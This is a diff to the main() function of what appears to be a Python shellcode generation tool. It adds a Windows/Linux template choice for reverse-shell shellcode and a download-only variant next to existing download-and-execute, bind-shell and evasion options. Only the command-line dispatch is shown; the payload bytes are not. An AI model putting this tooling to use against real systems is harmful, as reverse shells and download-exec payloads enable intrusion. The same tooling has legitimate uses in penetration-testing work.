@@ -23,6 +23,7 @@ import zlib
 import base64
 import hashlib
 import pyperclip
+import platform
 from collections import defaultdict
 from typing import Dict, List, Tuple, Optional, Union, Callable, Any
 
@@ -110,6 +111,10 @@ def main():
     param_group.add_argument("--stager", help="Stager shellcode file for staged payload")
     param_group.add_argument("--payload", help="Payload file for staged shellcode")
 
+    parser.add_argument("--platform", choices=["linux", "windows"], default="linux", help="Target platform for the shellcode (default: linux)")
+    parser.add_argument("--download-only", action="store_true", help="Generate shellcode that only downloads a file without executing it (only for supported platforms)")
+    parser.add_argument("--template", choices=["linux", "windows"], help="Reverse shell template platform (linux/windows). Overrides --platform for reverse shell.")
+
     args = parser.parse_args()
 
     try:
@@ -122,7 +127,24 @@ def main():
                 if args.rev_shell:
                     if not args.ip or not args.port:
                         parser.error("Reverse shell requires --ip and --port")
-                    shellcode = ShellcodeGenerator.generate_reverse_shell(args.ip, args.port, args.arch, args.mode)
+                    # Template/platform selection logic
+                    template = args.template or args.platform or "linux"
+                    if template == "windows":
+                        # Default to x86/32 if not specified
+                        arch = args.arch if args.arch else "x86"
+                        mode = args.mode if args.mode else ("64" if platform.machine().endswith("64") else "32")
+                        if (arch, mode) not in [("x86", "32"), ("x86", "64")]:
+                            print("[!] Windows reverse shell only supports x86 32/64. Defaulting to x86/32.")
+                            arch, mode = "x86", "32"
+                        shellcode = ShellcodeGenerator.generate_windows_reverse_shell(args.ip, args.port, arch, mode)
+                    elif template == "linux":
+                        # Default to x86/32 if not specified
+                        arch = args.arch if args.arch else "x86"
+                        mode = args.mode if args.mode else "32"
+                        shellcode = ShellcodeGenerator.generate_reverse_shell(args.ip, args.port, arch, mode)
+                    else:
+                        print(f"[!] Unknown template '{template}', defaulting to linux x86/32.")
+                        shellcode = ShellcodeGenerator.generate_reverse_shell(args.ip, args.port, "x86", "32")
                 elif args.bind_shell:
                     if not args.port:
                         parser.error("Bind shell requires --port")
@@ -130,7 +152,17 @@ def main():
                 elif args.exec_shell:
                     shellcode = ShellcodeGenerator.generate_exec_shell(args.exec_shell, args.arch, args.mode)
                 elif args.download_exec:
-                    shellcode = ShellcodeGenerator.generate_download_exec(args.download_exec, args.arch, args.mode)
+                    if args.download_only:
+                        # Only supported for Windows/x86/x64
+                        if args.platform != "windows":
+                            print("[!] --download-only is only supported for Windows platform.")
+                            return
+                        if (args.arch, args.mode) not in [("x86", "32"), ("x86", "64")]:
+                            print("[!] --download-only is only supported for x86/x64 architectures on Windows.")
+                            return
+                        shellcode = ShellcodeGenerator.generate_download_only(args.download_exec, args.arch, args.mode)
+                    else:
+                        shellcode = ShellcodeGenerator.generate_download_exec(args.download_exec, args.arch, args.mode)
 
                 # Apply encoding if requested
                 if args.encode and args.key:
@@ -202,9 +234,15 @@ def main():
                         pyperclip.copy(output)
                         print("[*] Copied to clipboard")
                     if args.out:
-                        with open(args.out, "w") as f:
-                            f.write(output)
-                        print(f"[*] Saved to {args.out}")
+                        try:
+                            if isinstance(output, str):
+                                with open(args.out, "w") as f:
+                                    f.write(output)
+                            else:
+                                print("[!] Output is not str for text format, not writing.")
+                            print(f"[*] Saved to {args.out}")
+                        except Exception as e:
+                            print(f"[!] Write error: {e}")
             except Exception as e:
                 print(f"[!] Error generating shellcode: {e}")
             return
@@ -266,7 +304,7 @@ def main():
                     return
                     
             shellcode = ShellcodeAssembler.assemble(
-                asm_code, args.arch, args.mode,
+                asm_code, str(args.arch), str(args.mode),
                 reverse=args.reverse,
                 optimize=args.optimize,
                 evasion=args.evasion,
@@ -288,17 +326,23 @@ def main():
             if args.out:
                 try:
                     if args.format == "raw":
-                        with open(args.out, "wb") as f:
-                            f.write(output)
+                        if isinstance(output, bytes):
+                            with open(args.out, "wb") as f:
+                                f.write(output)
+                        else:
+                            print("[!] Output is not bytes for raw format, not writing.")
                     else:
-                        with open(args.out, "w") as f:
-                            f.write(output)
+                        if isinstance(output, str):
+                            with open(args.out, "w") as f:
+                                f.write(output)
+                        else:
+                            print("[!] Output is not str for text format, not writing.")
                     print(f"[*] Saved to: {args.out}")
                 except Exception as e:
                     print(f"[!] Write error: {e}")
 
             if args.test:
-                ShellcodeTester.test_shellcode(shellcode, args.arch, args.mode)
+                ShellcodeTester.test_shellcode(shellcode, str(args.arch), str(args.mode))
 
             if args.validate:
                 try:
